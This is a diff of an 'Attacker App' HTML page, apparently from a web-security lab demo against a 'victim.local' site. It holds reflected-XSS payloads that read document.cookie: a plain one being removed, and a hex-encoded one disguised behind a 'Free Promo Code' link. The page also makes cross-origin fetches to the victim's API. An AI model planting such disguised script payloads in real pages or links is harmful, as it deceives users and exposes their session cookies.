@@ -1,18 +1,17 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Attacker App</title>
   </head>
-  <body style="background-color: rgb(255, 177, 177);">
+  <body style="background-color: rgb(255, 177, 177)">
     <h1>Attacker App - attacker.local</h1>
     <a href="https://victim.local/" target="_blank">Victim App</a>
     <br />
     <a
-      href="https://victim.local/?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
-      target="_blank"
-      >Exploit Victim App</a
+      href="/?message=%59%6f%75%72%20%50%72%6f%6d%6f%20%43%6f%64%65%20%69%73%3a%20%66%72%65%65%32%30%32%36%3c%73%63%72%69%70%74%3e%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e"
+      >Free Promo Code</a
     >
     <br />
     <img src="https://victim.local/image.jpg" alt="Image" />
@@ -21,12 +20,12 @@
     <script>
       // get
       fetch("https://victim.local/api/get").then((response) =>
-        response.text().then((data) => console.log(data))
+        response.text().then((data) => console.log(data)),
       );
 
       // post
       fetch("https://victim.local/api/post").then((response) =>
-        response.text().then((data) => console.log(data))
+        response.text().then((data) => console.log(data)),
       );
     </script>
   </body>
